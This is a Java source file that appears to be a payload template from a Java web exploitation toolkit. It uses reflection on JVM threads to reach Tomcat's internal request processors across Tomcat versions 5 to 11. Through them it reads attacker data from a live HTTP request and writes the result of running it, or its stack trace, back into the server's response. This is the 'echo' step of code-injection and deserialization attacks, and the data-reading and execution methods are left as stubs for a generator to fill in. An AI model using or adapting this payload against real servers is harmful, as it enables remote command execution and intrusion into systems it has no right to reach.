package com.reajason.javaweb.probe.payload.response;

import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.List;
import java.util.Set;

public class TomcatWriter {
    public TomcatWriter() {
        try {
            Set<Thread> threads = Thread.getAllStackTraces().keySet();
            for (Thread thread : threads) {
                Object target = null;
                try {
                    target = getFieldValue(thread, "target");
                } catch (NoSuchFieldException e) {
                    // JDK 21
                    target = getFieldValue(getFieldValue(thread, "holder"), "task");
                }
                if (target == null) {
                    continue;
                }
                Object requestGroupInfo = null;
                // Tomcat6 http-8080-Acceptor-0 <-> org.apache.tomcat.util.net.JIoEndpoint$Acceptor
                // Tomcat7 http-apr-8080-Poller <-> org.apache.tomcat.util.net.AprEndpoint$Poller
                // Tomcat8 http-nio-8080-Poller <-> org.apache.tomcat.util.net.NioEndpoint$Poller
                // Tomcat9 http-nio-8080-ClientPoller-0 <-> org.apache.tomcat.util.net.NioEndpoint$Poller
                // Tomcat10 http-nio-8080-Poller <-> org.apache.tomcat.util.net.NioEndpoint$Poller
                // Tomcat11 http-nio-8080-Poller <-> org.apache.tomcat.util.net.NioEndpoint$Poller
                String threadName = thread.getName();
                if ((threadName.contains("Poller") || threadName.contains("Acceptor"))
                        && !threadName.contains("ajp")
                ) {
                    try {
                        requestGroupInfo = getFieldValue(getFieldValue(getFieldValue(target, "this$0"), "handler"), "global");
                    } catch (NoSuchFieldException ignored) {
                        continue;
                    }
                } else if (target.getClass().getName().contains("ThreadPool$ControlRunnable")) {
                    // Tomcat5 http-8080-Processor23 <-> org.apache.tomcat.util.threads.ThreadPool$ControlRunnable
                    try {
                        Object toRun = getFieldValue(target, "toRun");
                        if (toRun != null) {
                            requestGroupInfo = getFieldValue(getFieldValue(getFieldValue(toRun, "endpoint"), "handler"), "global");
                        }
                    } catch (NoSuchFieldException e) {
                        continue;
                    }
                }
                if (requestGroupInfo == null) {
                    continue;
                }
                List<?> processors = (List<?>) getFieldValue(requestGroupInfo, "processors");
                for (Object processor : processors) {
                    // org.apache.coyote.Request
                    Object coyoteRequest = getFieldValue(processor, "req");
                    // org.apache.catalina.connector.Request
                    Object request = invokeMethod(coyoteRequest, "getNote", new Class[]{Integer.TYPE}, new Object[]{1});
                    // org.apache.catalina.connector.Response
                    Object response = invokeMethod(request, "getResponse", null, null);
                    String data = getDataFromReq(request);
                    if (data != null && !data.isEmpty()) {
                        PrintWriter writer = (PrintWriter) invokeMethod(response, "getWriter", null, null);
                        try {
                            writer.write(run(data));
                        } catch (Throwable e) {
                            e.printStackTrace(writer);
                        }
                        writer.flush();
                        writer.close();
                        return;
                    }
                }
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    private String getDataFromReq(Object request) throws Exception {
        return null;
    }

    private String run(String data) throws Exception {
        return null;
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(obj.getClass() + " Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }
}
